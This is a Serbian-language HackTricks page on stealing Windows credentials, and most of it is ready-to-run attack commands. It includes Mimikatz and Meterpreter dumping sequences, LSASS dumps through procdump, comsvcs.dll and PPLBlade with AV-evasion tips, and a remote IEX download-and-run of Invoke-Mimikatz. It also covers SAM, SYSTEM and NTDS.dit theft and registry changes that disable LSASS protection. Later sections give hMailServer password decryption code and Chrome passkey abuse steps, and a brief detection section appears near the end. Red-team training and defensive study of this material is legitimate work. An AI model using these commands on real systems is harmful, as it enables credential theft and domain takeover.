# Krađa Windows credentiala

{{#include ../../banners/hacktricks-training.md}}

## Credentiali alatom Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim zaštitama kredencijala ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke kredencijale.**

## Kredencijali sa Meterpreterom

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio za **pretragu lozinki i hash-eva** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **legitiman Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete koristiti za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izdvajanje** **credentials** iz dump-a.

Možete koristiti i [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** korišćenje **procdump.exe za dump lsass.exe** kao **maliciozno**, zato što **detektuju** stringove **„procdump.exe“ i „lsass.exe“**. Zato je **stealthier** proslediti **PID** procesa lsass kao **argument** programu procdump **umesto** **naziva lsass.exe.**

### Dumping lsass pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koja se nalazi u `C:\Windows\System32`, odgovorna je za **dumpovanje memorije procesa** u slučaju pada. Ova DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je predviđena za pozivanje pomoću `rundll32.exe`.\
Korišćenje prva dva argumenta nije relevantno, ali je treći podeljen na tri komponente. PID procesa koji treba dumpovati predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta mora biti isključivo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ove tri komponente, DLL kreira dump fajl i prenosi memoriju navedenog procesa u taj fajl.\
Korišćenje **comsvcs.dll** je moguće za dumpovanje lsass procesa, čime se eliminiše potreba za uploadovanjem i izvršavanjem procdump-a. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Za izvršavanje se koristi sledeća komanda:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na traku zadataka i kliknite na Task Manager
2. Kliknite na More details
3. Na kartici Processes pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“ i kliknite na „Create dump file“.

### Dumping lsass pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarni fajl potpisan od strane Microsoft-a, koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje Protected Process-a koji podržava obfuskaciju memory dump-a i njegovo prebacivanje na remote workstations bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump fajlova radi izbegavanja Defender mehanizama za detekciju zasnovanih na signature-ima
3. Uploadovanje memory dump-a pomoću RAW i SMB upload metoda bez upisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumpovanje bez MiniDumpWriteDump

Ink Dragon isporučuje dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, tako da se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholderom koji se sastoji od 32 malih slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novog Security Support Provider-a (SSP).
2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre nego što prosledi izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls**, razrešene iz hashovanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u fajl i zatvara handle, tako da exfiltration može da se obavi kasnije.

Napomene za operatora:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hard-kodovani placeholder apsolutnom putanjom do `rtu.txt`, tako da njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami unapred postaviti kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Fajlovi `%TEMP%\*.ddt` su kompresovani dump-ovi. Dekompresujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility radi izvlačenja credentials.
* Pokretanje `lals.exe` zahteva admin/SeTcb privilegije kako bi `AddSecurityPackageA` uspeo; nakon povratka iz poziva, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite registry unos i restartujte LSASS (reboot), ili ga ostavite radi dugoročne persistence.

## CrackMapExec

### Dump SAM hash-eva
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dumpovanje LSA tajni
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit sa ciljnog DC-a
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izvuci istoriju lozinki iz NTDS.dit fajla sa ciljnog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikažite atribut pwdLastSet za svaki nalog iz NTDS.dit datoteke
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** zato što su zaštićene.

### From Registry

Najlakši način da ukradete te datoteke jeste da preuzmete njihovu kopiju iz Registry-ja:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na svoju Kali mašinu i **izdvojite hash vrednosti** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete izvršiti kopiranje zaštićenih datoteka pomoću ove usluge. Potrebna su vam Administrator prava.

#### Using vssadmin

vssadmin binarna datoteka dostupna je samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**-a. Ovo je primer **kako da kopirate SAM file** (korišćeni hard disk je „C:“, a fajl se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credentiali Active Directory - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory-ja**, jer sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **hash-evi lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na lokaciji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: Ovde se čuvaju **security descriptors** za svaki objekat, čime se obezbeđuju sigurnost i kontrola pristupa sačuvanim objektima.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a nju koristi _lsass.exe_. Zatim bi se **deo** datoteke **NTDS.dit** mogao nalaziti **u memoriji `lsass` procesa** (verovatno možete pronaći najnovije pristupljene podatke zbog poboljšanja performansi korišćenjem **keša**).

#### Dešifrovanje hash-eva unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY**-a i **RC4**-a.
2. Dešifrujte **hash** pomoću **PEK**-a i **RC4**-a.
3. Dešifrujte **hash** pomoću **DES**-a.

**PEK** ima **istu vrednost** na **svakom domain controller-u**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću **BOOTKEY**-a iz **SYSTEM** datoteke domain controller-a (razlikuje se između domain controller-a)**. Zbog toga su vam za dobijanje credentiala iz datoteke NTDS.dit potrebne datoteke NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Možete koristiti i trik [**volume shadow copy**](#stealing-sam-and-system) za kopiranje datoteke **ntds.dit**. Imajte na umu da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, koristite trik [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash-eva iz NTDS.dit**

Kada **pribavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ za **izdvajanje hash-eva**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Možete ih takođe **automatski izvući** koristeći važećeg korisnika administratora domena:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se njihovo izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Konačno, možete koristiti i **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu se izdvojiti u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izdvajaju se samo tajne, već i čitavi objekti i njihovi atributi, što omogućava dalje izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opcion, ali omogućava dešifrovanje secrets (NT & LM hashes, supplemental credentials kao što su cleartext passwords, kerberos ili trust keys, NT & LM password histories). Pored ostalih informacija, izdvajaju se sledeći podaci: user i machine accounts sa njihovim hashes, UAC flags, timestamp za poslednji logon i promenu passworda, opisi accounts, names, UPN, SPN, groups i recursive memberships, stablo organizational units i membership, trusted domains sa tipom trusta, smerom i atributima...

## Lazagne

Preuzmite binary sa [here](https://github.com/AlessandroZ/LaZagne/releases). Ovaj binary možete koristiti za izdvajanje credentials iz različitih softvera.
```
lazagne.exe all
```
## Drugi alati za izvlačenje credential-a iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje credential-a iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite credential-e iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvucite akreditive iz SAM datoteke
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite**; lozinke će biti izdvojene.

## Prikupljanje podataka o neaktivnim RDP sesijama i slabljenje bezbednosnih kontrola

Ink Dragon’s FinalDraft RAT uključuje `DumpRDPHistory` tasker čije su tehnike korisne svakom red-teameru:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznih RDP veza** – analizirajte svaki korisnički hive na adresi `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva naziv servera, `UsernameHint` i vremensku oznaku poslednjeg upisivanja. Logiku iz FinalDraft-a možete replicirati pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Dokazi o dolaznim RDP vezama** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-ove događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada utvrdite koji se Domain Admin redovno povezuje, izvršite dump LSASS-a (pomoću LalsDumper/Mimikatz) dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS-u, koji se zatim mogu ponovo upotrebiti preko SMB/WinRM-a za preuzimanje datoteke `NTDS.dit` ili uspostavljanje persistence-a na domain controllerima.

### Registry downgrades koje cilja FinalDraft

Isti implant takođe menja nekoliko registry ključeva kako bi krađa credential-a bila jednostavnija:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Postavljanje `DisableRestrictedAdmin=1` primorava potpunu ponovnu upotrebu credential-a/ticketa tokom RDP-a, omogućavajući pivot-e u stilu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, tako da lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC online, pružajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpere kao što je LalsDumper.

## Credential-i baze podataka hMailServer (nakon kompromitovanja)

hMailServer čuva lozinku svoje DB u datoteci `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, pod `[Database] Password=`. Vrednost je Blowfish-šifrovana statičnim ključem `THIS_KEY_IS_NOT_SECRET`, uz zamene endianness-a 4-bajtnih reči. Koristite hex string iz INI-ja pomoću ovog Python isečka:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i izvršite upgrade ako je potrebno pre upita nad hash vrednostima:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Cracking ovih vrednosti može obezbediti ponovo upotrebljive kredencijale za WinRM/SSH pivote.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati hvataju **plaintext lozinke za logon** presretanjem LSA logon callback-a `LsaApLogonUserEx2`. Ideja je da se authentication package callback hook-uje ili obavije tako da se kredencijali uhvate **tokom logona** (pre hashovanja), a zatim upišu na disk ili vrate operatoru. Ovo se obično implementira kao helper koji se inject-uje u LSA ili se registruje kod njega, a zatim beleži svaki uspešan interaktivni/network logon događaj sa korisničkim imenom, domenom i lozinkom.<sup>[[1]](#references)</sup>

Operativne napomene:
- Zahteva local admin/SYSTEM privilegije za učitavanje helper-a u authentication path.
- Uhvaćeni kredencijali se pojavljuju samo kada dođe do logona (interaktivnog, RDP, service ili network logona, u zavisnosti od hook-a).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim konekcijama u `sqlstudio.bin` fajlu za svakog korisnika. Specijalizovani dumpers mogu parsirati fajl i oporaviti sačuvane SQL kredencijale. U shell-ovima koji vraćaju samo izlaz komandi, fajl se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Na strani operatora, ponovo izgradite fajl i pokrenite dumper lokalno da biste povratili akreditive:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Krađa Passkeys / WebAuthn kredencijala iz Chrome-a na Windows-u

Ako je ostvareno **izvršavanje koda** kao **korisnik žrtva** na Windows hostu koji koristi **Chrome + passkeys sinhronizovane sa Google Password Manager-om**, passkeys postaju zanimljiva meta u post-exploitation fazi, čak i **bez admin/SYSTEM** privilegija.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** skladišti protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da izlista **RP ID**, **username**, **credential ID** i materijal šifrovanog privatnog ključa za sinhronizovane passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** skladišti stanje lokalne registracije uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih akreditiva.<sup>[[4]](#references)</sup>

Brza trijaža:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs se i dalje mogu zloupotrebiti kao lokalni signing oracle

Ako browser izveze TPM-backed identity key kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izdvoji raw private key. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke pod kontrolom napadača:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
To znači da **hardware binding sprečava izvoz sa uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanom endpointu**.

### Praktični putevi zloupotrebe

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Izlistati `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
- Započeti passkey prijavljivanje i dobiti novi WebAuthn challenge.
- Upotrebiti ukradeni `wrapped_identity_private_key` blob na TPM-u žrtve za potpisivanje binding-a cloud-authenticator zahteva.
- Proslediti vraćeni assertion relying party-ju.
- Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Prisiliti ponovno onboarding prijavljivanje brisanjem `passkey_enclave_state` ili slanjem validne potpisane `device/forget` operacije.
- Ako onboarding ostavi uređaj u stanju **`uv_key_pending`**, registrovati UV javni ključ pod kontrolom napadača.
- Ako provider ne proverava attestation / poreklo novog UV ključa iz secure hardware-a, kasniji potpisi sa ključa napadača tretiraju se kao **`UV=1`**.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Prisiliti recovery ili ponovno pridruživanje kako bi Chrome preuzeo master secret za synced-passkey.
- Pratiti ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim dump-ovati Chrome memoriju dok je plaintext **security domain secret (SDS)** prisutan.
- Upotrebiti oporavljeni SDS za dešifrovanje šifrovanih polja u svakom `WebauthnCredentialSpecifics` zapisu i oporavak prenosivih WebAuthn privatnih ključeva.

### DFIR / ideje za detekciju

- Nadgledati **brisanje/ponovno kreiranje** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozoriti na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** od strane procesa koji nisu browser procesi.
- Upozoriti na **dump-ove Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Ispitati ponovljene zahteve za **Google Password Manager recovery PIN** ili neočekivani re-onboarding.
- Imajte na umu da WebAuthn **`signCount`** često nije koristan za synced passkeys jer može ostati konstantan, pa je klasična detekcija klonova nepouzdana.

## Reference

- [1] [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing putem SMTP-a → dešifrovanje hMailServer credential-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Nova attack površina u passwordless autentifikaciji](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG skladištenje ključeva](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Napadi na Microsoft sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory Data Store zaista funkcioniše: unutar NTDS.dit-a (1. deo)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
